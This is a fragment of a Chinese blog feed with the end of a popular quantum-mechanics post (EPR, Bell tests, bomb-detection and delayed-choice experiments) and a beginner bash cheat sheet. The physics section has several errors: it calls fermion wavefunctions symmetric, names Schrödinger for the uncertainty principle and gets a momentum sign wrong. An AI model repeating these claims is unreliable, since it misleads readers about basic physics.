它们的自旋是半整数，也就是±1/2、±3/2、±5/2这样，费米子是力的感受者。像电子、质子、中子都是费米子。</li></ol><p>在数学上，玻色子的波函数具有交换对称性，而费米子的波函数具有反交换对称性。两个全同费米子的波函数一定是交换对称的，而对称的中心点必须是0，而0代表了所有量子数都相同，所以量子数不能完全相同。</p><blockquote><p>简单的来说<br>之所以有化学，是因为泡利不相容原理；<br>之所以有泡利不相容原理，是因为费米子波函数是反对称的。<br>之所以费米子波函数是反对称的，是因为自旋；<br>之所以有自旋，是因为量子电动力学；<br><strong>设定了量子电动力学，就设定了原子核以外的世界</strong></p></blockquote><h3 id="全同粒子"><a href="#全同粒子" class="headerlink" title="全同粒子"></a>全同粒子</h3><p>在量子的微观世界，你是不能区分两个粒子的区别的，电子与电子，质子与质子，他们完全相同，没有任何区别，甚至连位置信息，因为薛定谔不确定性原理，你也不能通过位置来却别粒子。</p><h3 id="哥本哈根诠释"><a href="#哥本哈根诠释" class="headerlink" title="哥本哈根诠释"></a>哥本哈根诠释</h3><p>哥本哈根诠释并不是一套物理定律，而是一套物理研究方法和哲学立场</p><ol><li>量子力学只是关于测量结果的科学，它并不研究测量结果背后的”真相“到底是什么。</li><li>波函数只是一个描写概率的数学形式，而不是一个物理实在。</li><li>既然波函数根本不是物理实在，那么也就谈不上”坍缩“，所谓的坍缩也就是测量前后的数学信息变化而已。</li><li>波函数就是我们所能知道的全部信息。</li><li>为什么日常生活中的东西没有表现出量子力学的效应？因为宏观是众多粒子的集体行为。</li></ol><h3 id="爱因斯坦的最后一战"><a href="#爱因斯坦的最后一战" class="headerlink" title="爱因斯坦的最后一战"></a>爱因斯坦的最后一战</h3><p>1935年，爱因斯坦对量子力学发出最后一击。是一个思想实验，人们称为”EPR佯谬“。</p><p>这个思想实验是这样的：</p><blockquote><p>A和B两个全同粒子，它们本来是在一起的，然后因为原子核衰变分开了，然后它们沿着直线各自往相反的方向飞行。<br>根据动量守恒，A和B的动量必定是互为相反数，而且A走多远，B也一定走多远。<br>那么我只要测量一下A的位置是x，就知道了B的位置是-x。<br>我再测量B的动量是-p，那么A的动量就是-p<br>这样的话我就只对一个粒子测量了一次，但是却同时知道了它的位置和动量，违反了海森堡不确定性原理。</p></blockquote><p>爱因斯坦这个思想实验的所有测量都是合法的，没有犯任何错误。波尔阵营对此只能给出一个反驳：</p><p>A和B两个粒子应该被视为同一个量子系统，用一个波函数来描写。当测量A位置的时候，就相当于测了B的位置，从而破坏了B的动量。</p><p>这一次爱因斯坦没有接受，说，我这两个粒子可以距离几光年远再测量，如果测量A的同时就破坏了B的动量，这难道不是<strong>鬼魅般的超距作用</strong>吗？</p><p>对此波尔无言以对，波尔的唯一合理反驳就是量子系统真的有鬼魅般的超距作用。</p><p><strong>鬼魅般的超距作用，从此成为了量子力学的命门</strong></p><h3 id="鬼魅般的超距作用"><a href="#鬼魅般的超距作用" class="headerlink" title="鬼魅般的超距作用"></a>鬼魅般的超距作用</h3><p>贝尔在1964年提出了可证伪的实验理论设想：其中的关键结论是测量两端的结果满足”4% &gt; 1% + 1%“这样的不等式，如果满足，那么波尔是对的；不满足，爱因斯坦是对的。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/f6cfe3f7150c3746d309dfeecff898b.jpg" alt="Alt text| center| 300*0"><br><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/59ea0217eeb68158caf0617fbe892bf.jpg" alt="Alt text | center | 300*0"></p><p>最后实验证明，波尔是正确的，真的有鬼魅般的超距作用，是两个粒子之间发生的协调，这就是<strong>量子纠缠</strong>。</p><ol><li>粒子的某个属性，比如自旋，是在被观测的那一刹那才确定下来的。而不是提前设置好的。</li><li>量子纠缠是发生在两个粒子之间的。</li><li>量子纠缠虽然是真的，但是不能用来传递信息。</li></ol><h3 id="波函数的空间感知超能力"><a href="#波函数的空间感知超能力" class="headerlink" title="波函数的空间感知超能力"></a>波函数的空间感知超能力</h3><p>有这么一个实验，实验装置如下：</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/543f5e38435fbbe4689bf1d44d992d8.jpg" alt="Alt text | center | 500 *0"></p><p>用波的视角来看光，最后只会在探测器2上接受到光，因为波的干涉原理，这里是经典物理学范畴。</p><p>现在以粒子的视角来看看，每次只发射一个光子，那么会出现情况呢？<br>光子每一次通过分束器都有一半的概率被反射或者透过。那么是不是说探测器1就有一半的几率接受到这个光子？</p><p>答案是不对，这是因为光子会<strong>同时</strong>走过两条路径，在分束器2的时候，光子会自己与自己发生干涉，抵消掉去往探测器1的光子。实验结果与经典物理学一样。 这是怎么回事呢？</p><blockquote><p>光子在出发前的那一刹那，它的波函数，就对所有的路径、干涉仪全局的设置，有一个总体感知。是这个”<strong>总体感知</strong>“告诉光子应该如何运动。<br>也就是说光子即走了路径1，也走了路径2，这个光子处于两条路径的“量子叠加态”。</p></blockquote><p>第二个实验是探测炸弹实验，问如何用光学的方法探测是否有炸弹。这个炸弹无比敏感，对一个光子就会发生爆炸。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/01177690293872659e441e2be78b309.jpg" alt="Alt text | center | 500*0"></p><p>通过实验可以发现，有1/4的概率，探测器1会收到光子。那么只要4次里面有一次在探测器1上收到了光子，那么炸弹一定存在。（真实实验中，可以通过微调，将概率无限接近于1）</p><p>为什么会在探测器1上收到光子呢？因为光子在出发的一瞬间就知道路径2被阻断了，无法与自己干涉，所以在会出现在探测器1上。也就事说光子在去到分束器1的时候，就发生了坍缩，而导致只有路径1可以被选择。</p><p>这样，就做到了经典物理中无论如何也无法完成的探测炸弹的事。<strong>量子力学可以传递出经典物理禁止传递的信息</strong>。</p><blockquote><p>光子要有粒子性，波函数要有感知能力，这两个条件加起来才叫做量子力学。</p></blockquote><h3 id="波函数的时间感知能力"><a href="#波函数的时间感知能力" class="headerlink" title="波函数的时间感知能力"></a>波函数的时间感知能力</h3><p>有这么一个实验，实验装置如下：</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/ec47544409c42535bb276ed24b0738d.jpg" alt="Alt text| center | 500*0"></p><p>D1 和 D2 是测量光子粒子性的观测器，而可移动的屏幕可以理解为测量光子波动性的观测器。当用可移动的屏幕挡住D1和D2的时候，光子表现出来的是波的特性，有干涉条纹。而拿掉屏幕，用D1和D2作为观测的时候，不会发生干涉，会接收到每一个光子，表现出来的是粒子性。</p><p><img src="/2021/07/06/%E9%87%8F%E5%AD%90%E5%8A%9B%E5%AD%A6/b13faead4f0ba2aa96fe072d215ee51.png" alt="Alt text | center | 500*0"></p><p>也就是说，你想测量光子的波动性，那么光子就会表现出波的特性。如果你想测量光子的粒子性，那么光子就会表现出粒子性。<strong>光子是表现波还是粒子，取决于你问他什么问题</strong></p><ul><li><strong>惠勒的延迟选择</strong></li></ul><p>现在进一步实验，当我们在光子通过双缝之后，再决定是观察什么，那么光子会表现出来什么性质呢？<br>答案是，还是会表现出想要观测的性质。这意味着我们现在的选择，改变了过去的事件。</p><p><strong>量子纠缠实验证明波函数有超越时空的感知能力，延迟选择实验证明波函数有超越时间的感知能力</strong></p><p>但请注意，这种超越时间的感知能力只能影响，不能控制波函数，所以没有违反相对论。</p><p class='quest'>光子在测量前的一瞬间改变了性质，那会不会是它同时处于粒子与波的叠加态，然后测量的时候坍缩了呢？<p class='answer'>并不是，如果想要表现波的一面，那么就必须了解两条路径，积累到相应的相位差，才能正好形成干涉；而如果想要表现出粒子性，就必须真的走过一个缝，才能形成有缝的统计结果。它必须记得路上的情况才行。关键不在于它最后的坍缩的表现，而是他如何知道路径上的信息，它是如何过来的。]]></content>
      
      
      <categories>
          
          <category> 科学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 物理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shell 速查表</title>
      <link href="/2021/07/06/shell-%E9%80%9F%E6%9F%A5%E8%A1%A8/"/>
      <url>/2021/07/06/shell-%E9%80%9F%E6%9F%A5%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">msg=<span class="hljs-string">&quot;hello world&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-variable">$msg</span></span></code></pre></div></div><p><strong>变量名的命名须遵循如下规则：</strong></p><ul><li>命名只能使用英文字母，数字和下划线，首个字符不能以数字开头。</li><li>中间不能有空格，可以使用下划线（_）。</li><li>不能使用标点符号。</li><li>不能使用bash里的关键字（可用help命令查看保留关键字）。</li></ul><h2 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;执行的文件名：<span class="hljs-variable">$0</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第一个参数为：<span class="hljs-variable">$1</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第二个参数为：<span class="hljs-variable">$2</span>&quot;</span>;</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第三个参数为：<span class="hljs-variable">$3</span>&quot;</span>;</span></code></pre></div></div><p><strong>脚本内获取参数的格式为：</strong></p><p>$n。n 代表一个数字，1 为执行脚本的第一个参数，2 为执行脚本的第二个参数，以此类推……</p><p><strong>另外，还有几个特殊字符用来处理参数：</strong></p><table><thead><tr><th align="center">参数</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center"><code>$#</code></td><td align="left">传递到脚本的参数个数</td></tr><tr><td align="center"><code>$*</code></td><td align="left">以一个单字符串显示所有向脚本传递的参数。如”$*”用「”」括起来的情况、以”$1 $2 … $n”的形式输出所有参数。</td></tr><tr><td align="center"><code>$$</code></td><td align="left">脚本运行的当前进程ID号</td></tr><tr><td align="center"><code>$!</code></td><td align="left">后台运行的最后一个进程的ID号</td></tr><tr><td align="center"><code>$@</code></td><td align="left">与<code>$*</code>相同，但是使用时加引号，并在引号中返回每个参数。如”$@”用「”」括起来的情况、以”$1” “$2” … “$n” 的形式输出所有参数。</td></tr><tr><td align="center"><code>$-</code></td><td align="left">显示Shell使用的当前选项，与set命令功能相同。</td></tr><tr><td align="center"><code>$?</code></td><td align="left">显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误。</td></tr></tbody></table><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">my_array=(A B <span class="hljs-string">&quot;C&quot;</span> D)</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第一个元素为: <span class="hljs-variable">$&#123;my_array[0]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第二个元素为: <span class="hljs-variable">$&#123;my_array[1]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第三个元素为: <span class="hljs-variable">$&#123;my_array[2]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;第四个元素为: <span class="hljs-variable">$&#123;my_array[3]&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;数组的元素为: <span class="hljs-variable">$&#123;my_array[*]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;数组的元素为: <span class="hljs-variable">$&#123;my_array[@]&#125;</span>&quot;</span></span><span class="line"></br></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;数组元素个数为: <span class="hljs-variable">$&#123;#my_array[*]&#125;</span>&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;数组元素个数为: <span class="hljs-variable">$&#123;#my_array[@]&#125;</span>&quot;</span></span></code></pre></div></div><h2 id="基本运算符"><a href="#基本运算符" class="headerlink" title="基本运算符"></a>基本运算符</h2><blockquote><p>原生 bash 不支持简单的数学运算，但是可以通过其他命令来实现，例如 awk 和 expr，expr 最常用。</p></blockquote><p>expr 是一款表达式计算工具，使用它能完成表达式的求值操作。</p><h3 id="算数运算符"><a href="#算数运算符" class="headerlink" title="算数运算符"></a>算数运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2加2等于&quot;</span>`expr 2 + 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2减2等于&quot;</span>`expr 2 - 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2乘2等于&quot;</span>`expr 2 \* 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2除2等于&quot;</span>`expr 2 / 2`</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;2除2取余&quot;</span>`expr 2 % 2`</span></code></pre></div></div><h3 id="关系运算符"><a href="#关系运算符" class="headerlink" title="关系运算符"></a>关系运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -eq <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测两个数是否相等，相等返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -ne <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测两个数是否不相等，不相等返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测左边的数是否大于右边的，如果是，则返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测左边的数是否小于右边的，如果是，则返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -ge <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测左边的数是否大于等于右边的，如果是，则返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -le <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 检测左边的数是否小于等于右边的，如果是，则返回 true。</span></span></code></pre></div></div><h3 id="布尔运算符"><a href="#布尔运算符" class="headerlink" title="布尔运算符"></a>布尔运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">if</span> [ ! <span class="hljs-literal">false</span> ]       <span class="hljs-comment"># 非运算，返回 true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-literal">true</span> -o <span class="hljs-literal">false</span> ] <span class="hljs-comment"># 或运算，返回 true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-literal">true</span> -a <span class="hljs-literal">false</span> ] <span class="hljs-comment"># 与运算，返回 false</span></span></code></pre></div></div><h3 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> &amp;&amp; <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]]   <span class="hljs-comment"># 逻辑的 AND, 返回 false</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] &amp;&amp; [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 逻辑的 AND, 返回 false</span></span><span class="line"><span class="hljs-keyword">if</span> [[ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> || <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]]   <span class="hljs-comment"># 逻辑的 OR, 返回 true</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ] || [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ] <span class="hljs-comment"># 逻辑的 OR, 返回 true</span></span></code></pre></div></div><h3 id="字符串运算符"><a href="#字符串运算符" class="headerlink" title="字符串运算符"></a>字符串运算符</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=<span class="hljs-string">&quot;abc&quot;</span></span><span class="line">b=<span class="hljs-string">&quot;efg&quot;</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> = <span class="hljs-variable">$b</span> ]   <span class="hljs-comment"># 检测两个字符串是否相等，相等返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> != <span class="hljs-variable">$b</span> ]  <span class="hljs-comment"># 检测两个字符串是否相等，不相等返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ -z <span class="hljs-variable">$a</span> ]     <span class="hljs-comment"># 检测字符串长度是否为0，为0返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;<span class="hljs-variable">$a</span>&quot;</span> ]   <span class="hljs-comment"># 检测字符串长度是否为0，不为0返回 true。</span></span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> ]        <span class="hljs-comment"># 检测字符串是否为空，不为空返回 true。</span></span></code></pre></div></div><h3 id="文件测试运算符"><a href="#文件测试运算符" class="headerlink" title="文件测试运算符"></a>文件测试运算符</h3><p>文件测试运算符用于检测 Unix 文件的各种属性。</p><table><thead><tr><th align="center">操作符</th><th align="left">说明</th></tr></thead><tbody><tr><td align="center">-b file</td><td align="left">检测文件是否是块设备文件，如果是，则返回 true。</td></tr><tr><td align="center">-c file</td><td align="left">检测文件是否是字符设备文件，如果是，则返回 true。</td></tr><tr><td align="center">-d file</td><td align="left">检测文件是否是目录，如果是，则返回 true。</td></tr><tr><td align="center">-f file</td><td align="left">检测文件是否是普通文件（既不是目录，也不是设备文件），如果是，则返回 true。</td></tr><tr><td align="center">-g file</td><td align="left">检测文件是否设置了 SGID 位，如果是，则返回 true。</td></tr><tr><td align="center">-k file</td><td align="left">检测文件是否设置了粘着位(Sticky Bit)，如果是，则返回 true。</td></tr><tr><td align="center">-p file</td><td align="left">检测文件是否是有名管道，如果是，则返回 true。</td></tr><tr><td align="center">-u file</td><td align="left">检测文件是否设置了 SUID 位，如果是，则返回 true。</td></tr><tr><td align="center">-r file</td><td align="left">检测文件是否可读，如果是，则返回 true。</td></tr><tr><td align="center">-w file</td><td align="left">检测文件是否可写，如果是，则返回 true。</td></tr><tr><td align="center">-x file</td><td align="left">检测文件是否可执行，如果是，则返回 true。</td></tr><tr><td align="center">-s file</td><td align="left">检测文件是否为空（文件大小是否大于0），不为空返回 true。</td></tr><tr><td align="center">-e file</td><td align="left">检测文件（包括目录）是否存在，如果是，则返回 true。</td></tr></tbody></table><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><h3 id="命令格式"><a href="#命令格式" class="headerlink" title="命令格式"></a>命令格式</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It is a test&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> It is a <span class="hljs-built_in">test</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;\&quot;It is a test\&quot;&quot;</span>      <span class="hljs-comment"># 转义</span></span><span class="line">name=Chris</span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$name</span> is handsome&quot;</span></span><span class="line"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;OK! \n&quot;</span>             <span class="hljs-comment"># 显示换行 -e 开启转义</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;It is a test&quot;</span> &gt; myfile <span class="hljs-comment"># 显示结果定向至文件</span></span><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;$name\&quot;&#x27;</span>               <span class="hljs-comment"># 原样输入字符串，不进行转义或取变量（使用单引号）</span></span><span class="line"><span class="hljs-built_in">echo</span> `date`                  <span class="hljs-comment"># 显示命令执行结构</span></span></code></pre></div></div><h3 id="颜色显示"><a href="#颜色显示" class="headerlink" title="颜色显示"></a>颜色显示</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-taggerscript codeBlockLines"><span class="line">echo -e &quot;<span class="hljs-symbol">\0</span>33[字背景颜色；文字颜色m字符串<span class="hljs-symbol">\0</span>33[0m&quot;</span><span class="line"></br></span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[30m 黑色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[31m 红色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[32m 绿色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[33m 黄色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[34m 蓝色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[35m 紫色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[36m 天蓝字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[37m 白色字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line"></br></span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[40;37m 黑底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[41;37m 红底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[42;37m 绿底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[43;37m 黄底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[44;37m 蓝底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[45;37m 紫底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[46;37m 天蓝底白字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line">echo -e “<span class="hljs-symbol">\0</span>33[47;30m 白底黑字 <span class="hljs-symbol">\0</span>33[0m”</span><span class="line"></br></span><span class="line"><span class="hljs-symbol">\3</span>3[0m 关闭所有属性</span><span class="line"><span class="hljs-symbol">\3</span>3[1m 设置高亮度</span><span class="line"><span class="hljs-symbol">\3</span>3[4m 下划线</span><span class="line"><span class="hljs-symbol">\3</span>3[5m 闪烁</span><span class="line"><span class="hljs-symbol">\3</span>3[7m 反显</span><span class="line"><span class="hljs-symbol">\3</span>3[8m 消隐</span><span class="line"><span class="hljs-symbol">\3</span>3[30m — <span class="hljs-symbol">\3</span>3[37m 设置前景色</span><span class="line"><span class="hljs-symbol">\3</span>3[40m — <span class="hljs-symbol">\3</span>3[47m 设置背景色</span><span class="line"><span class="hljs-symbol">\3</span>3[nA 光标上移n行</span><span class="line"><span class="hljs-symbol">\3</span>3[nB 光标下移n行</span><span class="line"><span class="hljs-symbol">\3</span>3[nC 光标右移n行</span><span class="line"><span class="hljs-symbol">\3</span>3[nD 光标左移n行</span><span class="line"><span class="hljs-symbol">\3</span>3[y;xH设置光标位置</span><span class="line"><span class="hljs-symbol">\3</span>3[2J 清屏</span><span class="line"><span class="hljs-symbol">\3</span>3[K 清除从光标到行尾的内容</span><span class="line"><span class="hljs-symbol">\3</span>3[s 保存光标位置</span><span class="line"><span class="hljs-symbol">\3</span>3[u 恢复光标位置</span><span class="line"><span class="hljs-symbol">\3</span>3[?25l 隐藏光标</span><span class="line"><span class="hljs-symbol">\3</span>3[?25h 显示光标</span></code></pre></div></div><h2 id="sprintf"><a href="#sprintf" class="headerlink" title="sprintf"></a>sprintf</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4s\n&quot;</span> 姓名 性别 体重kg  </span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭靖 男 66.1234</span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 杨过 男 48.6543</span><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;%-10s %-8s %-4.2f\n&quot;</span> 郭芙 女 47.9876</span></code></pre></div></div><p>结果：</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" codeBlockLines"><span class="line">姓名     性别   体重kg</span><span class="line">郭靖     男      66.12</span><span class="line">杨过     男      48.65</span><span class="line">郭芙     女      47.99</span></code></pre></div></div><blockquote><p><code>%s %c %d %f</code> 都是格式替代符<br><code>d</code>: Decimal 十进制整数 – 对应位置参数必须是十进制整数，否则报错！<br><code>s</code>: String 字符串 – 对应位置参数必须是字符串或者字符型，否则报错！<br><code>c</code>: Char 字符 – 对应位置参数必须是字符串或者字符型，否则报错！<br><code>f</code>: Float 浮点 – 对应位置参数必须是数字型，否则报错！<br><code>%-10s</code> 指一个宽度为10个字符（-表示左对齐，没有则表示右对齐）,任何字符都会被显示在10个字符宽的字符内，如果不足则自动以空格填充，超过也会将内容全部显示出来。<br><code>%-4.2f</code> 指格式化为小数，其中.2指保留2位小数。</p></blockquote><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p>Shell中的 test 命令用于检查某个条件是否成立，它可以进行数值、字符和文件三个方面的测试。</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">num1=100</span><span class="line">num2=100</span><span class="line"><span class="hljs-keyword">if</span> <span class="hljs-built_in">test</span> $[num1] -eq $[num2]</span></code></pre></div></div><h2 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h2><h3 id="if-else"><a href="#if-else" class="headerlink" title="if-else"></a>if-else</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line">a=10</span><span class="line">b=20</span><span class="line"><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a 等于 b&quot;</span></span><span class="line"><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$a</span> -gt <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a 大于 b&quot;</span></span><span class="line"><span class="hljs-keyword">elif</span> [ <span class="hljs-variable">$a</span> -lt <span class="hljs-variable">$b</span> ]</span><span class="line"><span class="hljs-keyword">then</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;a 小于 b&quot;</span></span><span class="line"><span class="hljs-keyword">else</span></span><span class="line">   <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;没有符合的条件&quot;</span></span><span class="line"><span class="hljs-keyword">fi</span></span></code></pre></div></div><h3 id="for"><a href="#for" class="headerlink" title="for"></a>for</h3><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-bash codeBlockLines"><span class="line"><span class="hljs-meta">#!/bin/bash</span></span><span class="line"><span class="hljs-keyword">for</span> loop <span class="hljs-keyword">in</span> 1 2 3 4 5</span><span class="line"><span class="hljs-keyword">do</span></span><span class="line">    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;The value is: <span class="hljs-variable">$loop</span>&quot;</span></span><span class="line"><span class="hljs-keyword">done</span></span></code></pre></div></div><h3 id="while"><a href="#while" class="headerlink" 